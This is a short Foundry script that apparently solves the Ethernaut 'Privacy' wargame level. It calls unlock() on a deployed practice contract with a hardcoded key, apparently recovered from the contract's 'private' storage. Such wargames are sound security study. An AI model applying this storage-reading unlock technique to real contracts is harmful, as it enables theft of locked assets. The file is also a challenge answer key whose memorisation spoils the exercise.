// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract ForceSolution is Script {
    Privacy public privacy;

    function run() external {
        vm.startBroadcast();

        console.log("Solving Privacy...");

        privacy = Privacy(0x99dc5F0Ca3D14d5a95110486C4eBc8AD84a97a75);

        console.log("Locked: ", privacy.locked());
        privacy.unlock(bytes16(0x03f51210de0a2c9d25304f728b0e31e6));
        console.log("Locked: ", privacy.locked());

        vm.stopBroadcast();
        console.log("Privacy Solved!");
    }
}
